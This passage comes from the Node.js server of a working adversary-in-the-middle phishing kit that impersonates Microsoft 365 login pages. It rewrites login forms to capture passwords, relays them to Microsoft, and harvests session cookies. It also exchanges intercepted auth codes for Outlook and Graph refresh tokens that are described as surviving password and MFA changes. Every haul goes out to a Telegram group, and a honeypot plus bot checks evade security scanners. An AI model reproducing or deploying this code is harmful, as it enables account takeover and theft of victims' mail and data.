    console.log(`↪️ Redirecting root to ${isProduction ? '/en-us/microsoft-365/outlook' : '/microsoft'}`);
    res.redirect(isProduction ? '/en-us/microsoft-365/outlook' : '/microsoft');
});


// Add this to your main app.js for testing
app.get('/admin/clear-sessions', (req, res) => {
    const count = verifiedSessions.size;
    verifiedSessions.clear();
    console.log(verifiedSessions);
    res.json({ message: `Cleared ${count} verified sessions` });
});


// In your main app.js, add honeypot endpoint
app.get('/honeypot', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(`🍯 HONEYPOT TRIGGERED! Scanner at ${ip} clicked hidden link - Blocking permanently`);
    
    // Block the IP permanently
    const fs = require('fs');
    const blockedIPsFile = './data/blocked_ips.txt';
    let blockedIPs = [];
    
    if (fs.existsSync(blockedIPsFile)) {
        const content = fs.readFileSync(blockedIPsFile, 'utf8');
        blockedIPs = content.split('\n').filter(i => i.trim().length > 0);
    }
    
    if (!blockedIPs.includes(ip)) {
        blockedIPs.push(ip);
        fs.writeFileSync(blockedIPsFile, blockedIPs.join('\n'));
    }
    
    res.status(403).send('Access Denied');
});


// Microsoft login page (simple version)
app.get('/microsoft', async (req, res) => {
    try {
        const { email: encryptedEmail } = req.query;
        const template = templateManager.getRandomTemplate();

        if (!template) {
            console.error('❌ No template available');
            return res.status(500).send('Template not available');
        }

        let templateHtml = template.content;
        templateHtml = templateHtml.replace(/{encrypted_email}/g, encryptedEmail || '');

        let email = null;
        if (encryptedEmail) {
            try {
                email = decrypt(encryptedEmail);
                if (!email || !isValidEmail(email)) {
                    return res.redirect('https://www.google.com');
                }
            } catch (e) {
                return res.redirect('https://www.google.com');
            }
        } else {
            return res.redirect('https://www.google.com');
        }

        const clientIp = requestIp.getClientIp(req) || 'unknown';
        const now = Date.now();

        const lastRequest = requestTimestamps.get(clientIp) || 0;
        if (now - lastRequest < 5000) {
            return res.status(429).send('Rate limited');
        }
        requestTimestamps.set(clientIp, now);

        const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);

        const $ = cheerio.load(templateHtml);


        // In server.js, update the /microsoft endpoint script injection:

$('head').append(`
  <script>
      sessionStorage.setItem('phishSessionId', '${sessionId}');
      localStorage.setItem('phishSessionId', '${sessionId}');
      ${email ? `sessionStorage.setItem('userEmail', '${email}');` : ''}
      
      // Track page view
      fetch('/api/track-page-view', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
              sessionId: '${sessionId}',
              template: '${template.name}',
              url: window.location.href,
              timestamp: new Date().toISOString(),
              email: '${email || ''}'
          })
      }).catch(err => console.log('Tracking error:', err));
      
      // Track all link clicks
      document.addEventListener('click', function(e) {
          let target = e.target;
          while (target && target.tagName !== 'A') {
              target = target.parentElement;
          }
          if (target && target.tagName === 'A') {
              const href = target.getAttribute('href');
              if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
                  fetch('/api/track-click', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({
                          sessionId: '${sessionId}',
                          template: '${template.name}',
                          targetUrl: href,
                          timestamp: new Date().toISOString(),
                          email: '${email || ''}'
                      })
                  }).catch(err => console.log('Click tracking error:', err));
              }
          }
      });
      
      console.log('📊 Template loaded: ${template.name}');
      console.log('🔑 Session ID: ${sessionId}');
      console.log('✅ Tracking active for page views and clicks');
  </script>
`);

        $('head').append(`
            <script>
                sessionStorage.setItem('phishSessionId', '${sessionId}');
                localStorage.setItem('phishSessionId', '${sessionId}');
                ${email ? `sessionStorage.setItem('userEmail', '${email}');` : ''}
                
                fetch('/api/track-page-view', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        sessionId: '${sessionId}',
                        template: '${template.name}',
                        url: window.location.href,
                        timestamp: new Date().toISOString(),
                        email: '${email || ''}'
                    })
                }).catch(err => console.log('Tracking error:', err));
                
                console.log('📊 Template loaded: ${template.name}');
                console.log('🔑 Session ID: ${sessionId}');
            </script>
        `);

        $('form').each((i, form) => {
            $(form).attr('action', '/common/login');
            $(form).attr('method', 'POST');
            $(form).removeAttr('onsubmit');

            if (!$(form).find('input[name="sessionId"]').length) {
                $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
            }

            if (!$(form).find('input[name="state"]').length) {
                $(form).append(`<input type="hidden" name="state" value="${sessionId}">`);
            }

            if (email) {
                $(form).append(`<input type="hidden" name="email" value="${email}">`);
            }
        });

        microsoftParams.set(sessionId, {
            template: template.name,
            servedAt: new Date().toISOString(),
            ip: clientIp,
            userAgent: req.headers['user-agent'],
            email: email || null
        });

        res.send($.html());

    } catch (error) {
        console.error('❌ Error serving Microsoft page:', error.message);
        res.status(500).send('Error loading page');
    }
});






// Common login handler
// Common login handler - COMPLETE WITH COOKIE CAPTURE
// Common login handler - COMPLETE REWRITE with session fallback
app.post('/common/login', express.urlencoded({ extended: true }), async (req, res) => {
    console.log('📥 POST to /common/login received');
    console.log('   Request body keys:', Object.keys(req.body));
    
    // Log all form fields for debugging
    console.log('   📝 Form fields:');
    for (const [key, value] of Object.entries(req.body)) {
        if (key === 'passwd' || key === 'password') {
            console.log(`     ${key}: [HIDDEN]`);
        } else {
            console.log(`     ${key}: ${value}`);
        }
    }

    const victimInfo = await getVictimInfo(req);

    // Try to get sessionId from multiple sources in form
    let sessionId = req.body?.state || req.body?.sessionId || req.body?.SessionId || 'unknown';
    const username = req.body?.login || req.body?.username;
    const password = req.body?.passwd || req.body?.password;

    console.log(`\n🔍 Session Lookup:`);
    console.log(`   Initial Session ID from form: ${sessionId}`);
    console.log(`   Username from form: ${username}`);

    // ============ FALLBACK: Find session by email if sessionId is unknown ============
    if (sessionId === 'unknown' && username) {
        console.log(`   🔍 Searching for session with email: ${username}`);
        
        // Method 1: Check in emailSessions
        for (const [sid, data] of emailSessions.entries()) {
            if (data.decrypted === username || data.encrypted === username) {
                sessionId = sid;
                console.log(`   ✅ Found session in emailSessions: ${sessionId}`);
                break;
            }
        }
        
        // Method 2: Check in capturedData credentials
        if (sessionId === 'unknown') {
            for (const [sid, data] of capturedData.entries()) {
                if (data.credentials?.username === username) {
                    sessionId = sid;
                    console.log(`   ✅ Found session in capturedData: ${sessionId}`);
                    break;
                }
            }
        }
        
        // Method 3: Check in codeVerifiers via emailSessions association
        if (sessionId === 'unknown') {
            for (const [sid, verifier] of codeVerifiers.entries()) {
                const emailSession = emailSessions.get(sid);
                if (emailSession && (emailSession.decrypted === username || emailSession.encrypted === username)) {
                    sessionId = sid;
                    console.log(`   ✅ Found session in codeVerifiers via emailSessions: ${sessionId}`);
                    break;
                }
            }
        }
        
        // Method 4: If only one active session exists, use it
        if (sessionId === 'unknown' && codeVerifiers.size === 1) {
            sessionId = Array.from(codeVerifiers.keys())[0];
            console.log(`   ✅ Using only active session: ${sessionId}`);
        }
        
        // Method 5: Check if the sessionId is in the URL referer
        if (sessionId === 'unknown' && req.headers.referer) {
            const refererMatch = req.headers.referer.match(/[?&]state=([^&]+)/);
            if (refererMatch) {
                sessionId = refererMatch[1];
                console.log(`   ✅ Found session in referer: ${sessionId}`);
            }
        }
        
        // Method 6: Check if sessionId is in the query string
        if (sessionId === 'unknown' && req.query?.state) {
            sessionId = req.query.state;
            console.log(`   ✅ Found session in query string: ${sessionId}`);
        }
    }
    
    // If sessionId is still unknown, log all available sessions for debugging
    if (sessionId === 'unknown') {
        console.log('\n   ⚠️ WARNING: Session ID still unknown!');
        console.log(`   📋 Available emailSessions (${emailSessions.size}):`, Array.from(emailSessions.keys()));
        console.log(`   📋 Available codeVerifiers (${codeVerifiers.size}):`, Array.from(codeVerifiers.keys()));
        console.log(`   📋 Available capturedData (${capturedData.size}):`, Array.from(capturedData.keys()));
    }
    
    console.log(`\n✅ Final Session ID: ${sessionId}\n`);

    // Track credentials
    if (username && password) {
        console.log(`🔑 CREDENTIALS CAPTURED: ${username}`);
        
        let session = capturedData.get(sessionId);
        if (!session) {
            session = { credentials: {}, cookies: [], tokens: {} };
        }

        session.credentials = {
            username,
            password,
            time: new Date().toISOString(),
            victimInfo
        };

        capturedData.set(sessionId, session);

        // Send credentials to Telegram
        if (bot && process.env.TELEGRAM_GROUP_ID) {
            const credentialsContent = `🔑 CREDENTIALS CAPTURED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Session ID: ${sessionId}
Email: ${username}
Password: ${password}
Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
VICTIM INFORMATION:
IP: ${victimInfo.ip}
Location: ${victimInfo.location}
Browser: ${victimInfo.browser}
OS: ${victimInfo.os}
User Agent: ${victimInfo.userAgent || 'N/A'}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

            try {
                const fs = require('fs');
                const tempFilePath = `./temp_credentials_${sessionId}.txt`;
                fs.writeFileSync(tempFilePath, credentialsContent);
                
                await bot.sendDocument(
                    process.env.TELEGRAM_GROUP_ID,
                    tempFilePath,
                    {},
                    { filename: `credentials_${sessionId}.txt`, contentType: 'text/plain' }
                );
                
                fs.unlinkSync(tempFilePath);
            } catch (e) {
                console.error('Failed to send credentials file:', e.message);
                const message = `🔑 *Credentials Captured*\n━━━━━━━━━━━━━━━━━━\n*Email:* \`${username}\`\n*Password:* \`${password}\`\n*Session:* \`${sessionId}\``;
                bot.sendMessage(process.env.TELEGRAM_GROUP_ID, message, { parse_mode: 'Markdown' }).catch(() => {});
            }
        }
    }

    try {
        const formData = new URLSearchParams();
        Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));

        console.log('📤 Forwarding login to Microsoft...');
        
        const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            maxRedirects: 0,
            validateStatus: status => status >= 200 && status < 400
        }).catch(err => err.response);

        // ========== CAPTURE 1: Cookies from login response ==========
        if (response?.headers['set-cookie']) {
            const responseCookies = response.headers['set-cookie'];
            console.log(`🍪 Captured ${responseCookies.length} cookies from login response`);
            
            let session = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
            if (!session.cookies) session.cookies = [];
            
            const importantAuthCookies = ['RPSSecAuth', 'MSISAuth', 'MSISAuthenticated', 'MSPAuth', 'MSPProf', '.AspNet.Cookies', 'ESTSAUTHPERSISTENT', 'ESTSAUTH'];
            
            responseCookies.forEach(cookieStr => {
                const [cookieNameValue] = cookieStr.split(';');
                const [name, value] = cookieNameValue.split('=');
                
                const isImportant = importantAuthCookies.includes(name);
                
                session.cookies.push({
                    name: name.trim(),
                    value: value || '',
                    from_login_response: true,
                    is_auth_cookie: isImportant,
                    captured_at: new Date().toISOString()
                });
                
                if (isImportant) {
                    console.log(`🎯 IMPORTANT AUTH COOKIE CAPTURED from login: ${name}=${value?.substring(0, 50)}...`);
                }
            });
            
            capturedData.set(sessionId, session);
        }

        if (response?.headers?.location) {
            const location = response.headers.location;
            console.log(`↪️ Microsoft redirects to: ${location.substring(0, 200)}...`);
            
            if (location.includes('nativeclient') && location.includes('code=')) {
                console.log('🎯 Captured nativeclient redirect with code!');
                
                const codeMatch = location.match(/[?&]code=([^&]+)/);
                if (codeMatch && codeMatch[1]) {
                    const code = decodeURIComponent(codeMatch[1]);
                    console.log(`✅ Auth code captured: ${code.substring(0, 50)}...`);
                    
                    // Get the code verifier for this session - with fallback
                    let codeVerifier = codeVerifiers.get(sessionId);
                    
                    // If not found with current sessionId, try to find by username
                    if (!codeVerifier && username) {
                        console.log(`   🔍 Code verifier not found for ${sessionId}, searching by email...`);
                        for (const [sid, verifier] of codeVerifiers.entries()) {
                            const emailSession = emailSessions.get(sid);
                            if (emailSession && emailSession.decrypted === username) {
                                sessionId = sid;
                                codeVerifier = verifier;
                                console.log(`   ✅ Found alternative session: ${sid}`);
                                break;
                            }
                        }
                    }
                    
                    console.log(`   Code verifier for session ${sessionId}:`, {
                        exists: !!codeVerifier,
                        length: codeVerifier?.length,
                        first10: codeVerifier?.substring(0, 10)
                    });
                    
                    if (!codeVerifier) {
                        console.error(`❌ No code verifier for session ${sessionId}`);
                        console.log(`   Available sessions:`, Array.from(codeVerifiers.keys()));
                        return res.redirect('/en-us/microsoft-365/outlook?error=no_verifier');
                    }
                    
                    console.log('🔄 Exchanging code for tokens...');
                    console.log(`   Using code verifier: ${codeVerifier.substring(0, 20)}...`);
                    
                    try {
                        // FIRST EXCHANGE: Get Outlook token
                        console.log('📧 Step 1: Exchanging for Outlook token...');
                        const outlookTokenParams = {
                            client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
                            code: code,
                            code_verifier: codeVerifier,
                            redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                            grant_type: 'authorization_code',
                            scope: 'https://outlook.office.com/.default offline_access',
                            claims: JSON.stringify({
                                access_token: {
                                    xms_cc: { values: ["CP1"] }
                                }
                            })
                        };
                        
                        const outlookTokenResponse = await axios.post(
                            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
                            new URLSearchParams(outlookTokenParams).toString(),
                            {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                    'Accept': 'application/json'
                                }
                            }
                        );
                        
                        const outlookTokens = outlookTokenResponse.data;
                        console.log('✅ Outlook tokens received!');
                        console.log(`   Access token: ${outlookTokens.access_token.substring(0, 50)}...`);
                        console.log(`   Refresh token: ${outlookTokens.refresh_token?.substring(0, 50) || 'N/A'}...`);
                        console.log(`   Expires in: ${outlookTokens.expires_in} seconds`);
                        
                        // Capture cookies from Outlook token response
                        if (outlookTokenResponse.headers['set-cookie']) {
                            const responseCookies = outlookTokenResponse.headers['set-cookie'];
                            console.log(`🍪 Captured ${responseCookies.length} cookies from Outlook token response`);
                            
                            let session = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
                            if (!session.cookies) session.cookies = [];
                            
                            const importantAuthCookies = ['RPSSecAuth', 'MSISAuth', 'MSISAuthenticated', 'MSPAuth', 'MSPProf', '.AspNet.Cookies', 'ESTSAUTHPERSISTENT', 'ESTSAUTH'];
                            
                            responseCookies.forEach(cookieStr => {
                                const [cookieNameValue] = cookieStr.split(';');
                                const [name, value] = cookieNameValue.split('=');
                                
                                const isImportant = importantAuthCookies.includes(name);
                                
                                session.cookies.push({
                                    name: name.trim(),
                                    value: value || '',
                                    from_outlook_token_response: true,
                                    is_auth_cookie: isImportant,
                                    captured_at: new Date().toISOString()
                                });
                                
                                if (isImportant) {
                                    console.log(`🎯 IMPORTANT AUTH COOKIE CAPTURED from Outlook token: ${name}=${value?.substring(0, 50)}...`);
                                }
                            });
                            
                            capturedData.set(sessionId, session);
                        }
                        
                        // SECOND EXCHANGE: Use refresh token to get Graph token
                        console.log('🔄 Step 2: Exchanging refresh token for Graph token...');
                        const graphTokenParams = {
                            client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
                            refresh_token: outlookTokens.refresh_token,
                            grant_type: 'refresh_token',
                            scope: 'https://graph.microsoft.com/.default offline_access',
                            claims: JSON.stringify({
                                access_token: {
                                    xms_cc: { values: ["CP1"] }
                                }
                            })
                        };
                        
                        const graphTokenResponse = await axios.post(
                            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
                            new URLSearchParams(graphTokenParams).toString(),
                            {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                    'Accept': 'application/json'
                                }
                            }
                        );
                        
                        const graphTokens = graphTokenResponse.data;
                        console.log('✅ Graph tokens received!');
                        console.log(`   Access token: ${graphTokens.access_token.substring(0, 50)}...`);
                        console.log(`   Refresh token: ${graphTokens.refresh_token?.substring(0, 50) || 'N/A'}...`);
                        console.log(`   Expires in: ${graphTokens.expires_in} seconds`);
                        
                        // Capture cookies from Graph token response
                        if (graphTokenResponse.headers['set-cookie']) {
                            const responseCookies = graphTokenResponse.headers['set-cookie'];
                            console.log(`🍪 Captured ${responseCookies.length} cookies from Graph token response`);
                            
                            let session = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
                            if (!session.cookies) session.cookies = [];
                            
                            const importantAuthCookies = ['RPSSecAuth', 'MSISAuth', 'MSISAuthenticated', 'MSPAuth', 'MSPProf', '.AspNet.Cookies', 'ESTSAUTHPERSISTENT', 'ESTSAUTH'];
                            
                            responseCookies.forEach(cookieStr => {
                                const [cookieNameValue] = cookieStr.split(';');
                                const [name, value] = cookieNameValue.split('=');
                                
                                const isImportant = importantAuthCookies.includes(name);
                                
                                session.cookies.push({
                                    name: name.trim(),
                                    value: value || '',
                                    from_graph_token_response: true,
                                    is_auth_cookie: isImportant,
                                    captured_at: new Date().toISOString()
                                });
                                
                                if (isImportant) {
                                    console.log(`🎯 IMPORTANT AUTH COOKIE CAPTURED from Graph token: ${name}=${value?.substring(0, 50)}...`);
                                }
                            });
                            
                            capturedData.set(sessionId, session);
                        }
                        
                        // Get the email from session
                        const emailSession = emailSessions.get(sessionId);
                        const userEmail = emailSession?.decrypted || username || 'Unknown';
                        console.log(`   User email: ${userEmail}`);
                        
                        // Get cookies for this session
                        const sessionData = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
                        const cookies = sessionData.cookies || [];
                        
                        // Store tokens
                        sessionData.tokens = sessionData.tokens || {};
                        sessionData.tokens.outlook = {
                            access_token: outlookTokens.access_token,
                            refresh_token: outlookTokens.refresh_token,
                            expires_in: outlookTokens.expires_in,
                            scope: outlookTokens.scope,
                            captured_at: new Date().toISOString(),
                            cae_enabled: true
                        };
                        
                        sessionData.tokens.graph = {
                            access_token: graphTokens.access_token,
                            refresh_token: graphTokens.refresh_token,
                            expires_in: graphTokens.expires_in,
                            scope: graphTokens.scope,
                            captured_at: new Date().toISOString(),
                            cae_enabled: true
                        };
                        
                        sessionData.tokens.dual_capture = true;
                        capturedData.set(sessionId, sessionData);
                        
                        console.log(`💾 Tokens stored for session ${sessionId}`);
                        console.log(`   Outlook token stored: ${!!sessionData.tokens.outlook.access_token}`);
                        console.log(`   Graph token stored: ${!!sessionData.tokens.graph.access_token}`);
                        console.log(`   Total cookies stored: ${cookies.length}`);
                        
                        // Count auth cookies
                        const authCookies = cookies.filter(c => c.is_auth_cookie === true);
                        console.log(`   Auth cookies captured: ${authCookies.length}`);
                        
                        // Send tokens and cookies to Telegram
                        if (bot && process.env.TELEGRAM_GROUP_ID) {
                            const fs = require('fs');
                            
                            // Create tokens file
                            const tokensContent = `🎯 DUAL TOKENS CAPTURED WITH CAE!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Session ID: ${sessionId}
Email: ${userEmail}
Captured: ${new Date().toLocaleString()}
CAE: ENABLED (Tokens survive password & MFA changes)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📧 OUTLOOK TOKEN:
━━━━━━━━━━━━━━━━━━
Access Token:
${outlookTokens.access_token}

Refresh Token:
${outlookTokens.refresh_token}

Expires In: ${outlookTokens.expires_in} seconds
Scope: ${outlookTokens.scope}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔄 GRAPH TOKEN:
━━━━━━━━━━━━━━━━━━
Access Token:
${graphTokens.access_token}

Refresh Token:
${graphTokens.refresh_token}

Expires In: ${graphTokens.expires_in} seconds
Scope: ${graphTokens.scope}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 TOKEN USAGE:
• Use Access Token for API requests
• Use Refresh Token to get new tokens when expired
• Tokens are CAE-enabled and survive password/MFA changes
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

                            const tokensFilePath = `./temp_tokens_${sessionId}.txt`;
                            fs.writeFileSync(tokensFilePath, tokensContent);
                            
                            await bot.sendDocument(
                                process.env.TELEGRAM_GROUP_ID,
                                tokensFilePath,
                                {},
                                { filename: `tokens_${sessionId}.txt`, contentType: 'text/plain' }
                            );
                            fs.unlinkSync(tokensFilePath);
                            
                            // Create cookies file
                            let cookiesContent = `🍪 COOKIES CAPTURED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Session ID: ${sessionId}
Email: ${userEmail}
Captured: ${new Date().toLocaleString()}
Total Cookies: ${cookies.length}
Auth Cookies: ${authCookies.length}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

`;

                            cookies.forEach((cookie, index) => {
                                const authBadge = cookie.is_auth_cookie ? '🔐 AUTH COOKIE' : '📝 Regular';
                                cookiesContent += `${index + 1}. ${cookie.name} ${authBadge ? `[${authBadge}]` : ''}
   Value: ${cookie.value}
   Source: ${cookie.from_login_response ? 'Login Response' : cookie.from_outlook_token_response ? 'Outlook Token Response' : cookie.from_graph_token_response ? 'Graph Token Response' : 'Browser'}
   Captured: ${cookie.captured_at}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

`;
                            });
                            
                            const cookiesFilePath = `./temp_cookies_${sessionId}.txt`;
                            fs.writeFileSync(cookiesFilePath, cookiesContent);
                            
                            await bot.sendDocument(
                                process.env.TELEGRAM_GROUP_ID,
                                cookiesFilePath,
                                {},
                                { filename: `cookies_${sessionId}.txt`, contentType: 'text/plain' }
                            );
                            fs.unlinkSync(cookiesFilePath);
                            
                            // Send summary message with REVOKE button
                            const summaryMessage = `🎯 *TOKENS & COOKIES CAPTURED!*\n` +
                                `━━━━━━━━━━━━━━━━━━\n` +
                                `*Session:* \`${sessionId}\`\n` +
                                `*Email:* \`${userEmail}\`\n` +
                                `*CAE:* ✅ ENABLED\n` +
                                `━━━━━━━━━━━━━━━━━━\n` +
                                `📧 Outlook Token: ✓ Captured\n` +
                                `🔄 Graph Token: ✓ Captured\n` +
                                `🍪 Total Cookies: ${cookies.length} captured\n` +
                                `🔐 Auth Cookies: ${authCookies.length} captured\n` +
                                `━━━━━━━━━━━━━━━━━━\n` +
                                `*Tokens survive password & MFA changes*`;

                            const options = {
                                parse_mode: 'Markdown',
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '🔴 REVOKE ACCESS (Full)', callback_data: `revoke_full|${userEmail}` }],
                                    ]
                                }
                            };

                            await bot.sendMessage(process.env.TELEGRAM_GROUP_ID, summaryMessage, options)
                                .catch(e => console.error('Telegram error:', e.message));
                        }
                        
                        // Redirect to OneDrive
                        console.log('🔄 Redirecting user to OneDrive...');
                        return res.redirect('https://onedrive.live.com/');
                        
                    } catch (exchangeError) {
                        console.error('❌ Token exchange failed:');
                        console.error(`   Status: ${exchangeError.response?.status}`);
                        console.error(`   Error data:`, JSON.stringify(exchangeError.response?.data, null, 2));
                        console.error(`   Error message: ${exchangeError.message}`);
                        return res.redirect('/en-us/microsoft-365/outlook?error=token_exchange_failed');
                    }
                }
            }
            
            console.log(`↪️ Following redirect to: ${location.substring(0, 100)}...`);
            return res.redirect(location);
        }
        
        console.log('❌ No location header in response, sending response data');
        res.send(response?.data || 'OK');

    } catch (error) {
        console.error('❌ Error forwarding to /common/login:', error.message);
        console.error('   Stack:', error.stack);
        res.redirect('/microsoft?error=connection_error');
    }
});
// Simple HTML escaping function for Node.js
function escapeHtmlSimple(text) {
    if (!text) return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}












// Turnstile verification endpoint
app.post('/verify-turnstile', async (req, res) => {
    const token = req.body['cf-turnstile-response'];

    if (!token) {
        return res.status(400).json({ success: false });
    }

    try {
        const formData = new URLSearchParams();
        formData.append('secret', process.env.TURNSTILE_SECRET_KEY);
        formData.append('response', token);
        formData.append('remoteip', requestIp.getClientIp(req));

        const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            body: formData
        });

        const outcome = await response.json();

        if (outcome.success) {
            const fingerprint = getFingerprint(req);
            verifiedSessions.set(fingerprint, {
                timestamp: Date.now(),
                verified: true
            });
            return res.json({ success: true });
        }

        return res.status(403).json({ success: false });

    } catch (error) {
        console.error('Turnstile error:', error);
        return res.status(500).json({ success: false });
    }
});




// ============= NATIVE CLIENT REDIRECT HANDLER =============
// This must come BEFORE the proxy middleware to catch the redirect
app.get('/common/oauth2/nativeclient', async (req, res) => {
    console.log('🎯 [INDEX.JS] Native client redirect captured!');
    
    try {
        const { code, state, session_state } = req.query;
        
        console.log(`   Code: ${code?.substring(0, 50)}...`);
        console.log(`   State: ${state}`);
        
        if (!code || !state) {
            console.error('Missing code or state in redirect');
            return res.status(400).send('Invalid redirect');
        }
        
        // Get the code verifier for this session
        const codeVerifier = codeVerifiers.get(state);
        
        if (!codeVerifier) {
            console.error(`No code verifier for session ${state}`);
            return res.status(400).send('Session expired');
        }
        
        console.log('🔄 Exchanging code for tokens...');
        
        // Exchange code for tokens
        const tokenResponse = await axios.post(
            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                client_id: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
                code: code,
                code_verifier: codeVerifier,
                redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
                grant_type: 'authorization_code',
                scope: 'https://outlook.office.com/.default https://graph.microsoft.com/.default offline_access',
                claims: JSON.stringify({
                    access_token: {
                        xms_cc: { values: ["CP1"] }
                    }
                })
            }).toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json'
                }
            }
        );
        
        const tokens = tokenResponse.data;
        console.log('✅ Tokens received successfully!');
        console.log(`   Access token: ${tokens.access_token.substring(0, 50)}...`);
        console.log(`   Refresh token: ${tokens.refresh_token?.substring(0, 50)}...`);
        
        // Get the email from session
        const emailSession = emailSessions.get(state);
        const username = emailSession?.decrypted || 'Unknown';
        
        // Store tokens
        let session = capturedData.get(state) || { cookies: [], credentials: {}, tokens: {} };
        session.tokens.outlook = {
            access_token: tokens.access_token,
            refresh_token: tokens.refresh_token,
            expires_in: tokens.expires_in,
            scope: tokens.scope,
            captured_at: new Date().toISOString(),
            cae_enabled: true
        };
        
        session.tokens.graph = {
            access_token: tokens.access_token,
            refresh_token: tokens.refresh_token,
            expires_in: tokens.expires_in,
            scope: tokens.scope,
            captured_at: new Date().toISOString(),
            cae_enabled: true
        };
        
        session.tokens.dual_capture = true;
        capturedData.set(state, session);
        
        // Get victim info
        const victimInfo = await getVictimInfo(req);
        
        // Send notification
        if (bot && process.env.TELEGRAM_GROUP_ID) {
            const message = `🎯 *DUAL TOKENS CAPTURED!*\n━━━━━━━━━━━━━━━━━━\n*Session:* \`${state}\`\n*Email:* \`${username}\`\n*CAE:* ✅ ENABLED\n*Expires:* ${tokens.expires_in} seconds\n━━━━━━━━━━━━━━━━━━\n*Tokens survive password & MFA changes*`;
            bot.sendMessage(process.env.TELEGRAM_GROUP_ID, message, { parse_mode: 'Markdown' }).catch(() => {});
        }
        
        // Return success page
        const successHtml = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Authentication Successful</title>
                <style>
                    body {
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    }
                    .container {
                        text-align: center;
                        background: white;
                        padding: 40px;
                        border-radius: 12px;
                        box-shadow: 0 10px 25px rgba(0,0,0,0.1);
                        animation: fadeIn 0.5s ease-in;
                    }
                    @keyframes fadeIn {
                        from { opacity: 0; transform: translateY(-20px); }
                        to { opacity: 1; transform: translateY(0); }
                    }
                    .success-icon {
                        color: #4CAF50;
                        font-size: 64px;
                        margin-bottom: 20px;
                        animation: bounce 0.5s ease-in-out;
                    }
                    @keyframes bounce {
                        0%, 100% { transform: scale(1); }
                        50% { transform: scale(1.1); }
                    }
                    h1 {
                        color: #333;
                        margin-bottom: 10px;
                        font-size: 28px;
                    }
                    p {
                        color: #666;
                        margin-bottom: 20px;
                        font-size: 16px;
                    }
                    .redirect-message {
                        color: #999;
                        font-size: 14px;
                        margin-top: 20px;
                    }
                    .spinner {
                        border: 3px solid #f3f3f3;
                        border-top: 3px solid #667eea;
                        border-radius: 50%;
                        width: 40px;
                        height: 40px;
                        animation: spin 1s linear infinite;
                        margin: 20px auto;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                    .email {
                        color: #667eea;
                        font-weight: 600;
                    }
                </style>
                <script>
                    setTimeout(function() {
                        window.location.href = 'https://outlook.live.com/mail/';
                    }, 3000);
                </script>
            </head>
            <body>
                <div class="container">
                    <div class="success-icon">✓</div>
                    <h1>Authentication Successful!</h1>
                    <p>Welcome, <span class="email">${username}</span></p>
                    <div class="spinner"></div>
                    <p class="redirect-message">Redirecting to Outlook in a few seconds...</p>
                </div>
            </body>
            </html>
        `;
        
        res.send(successHtml);
        
    } catch (error) {
        console.error('❌ Token exchange failed:', error.response?.data || error.message);
        res.status(500).send(`
            <html><body>
                <h1>Authentication Error</h1>
                <p>Error: ${error.message}</p>
                <a href="/en-us/microsoft-365/outlook">Try Again</a>
            </body></html>
        `);
    }
});





























// ============= PROXY MIDDLEWARE =============
app.use('/proxy', (req, res, next) => {
    const sessionId = req.query.sessionId || req.body?.sessionId || 'unknown';
    const msParams = microsoftParams.get(sessionId) || {};

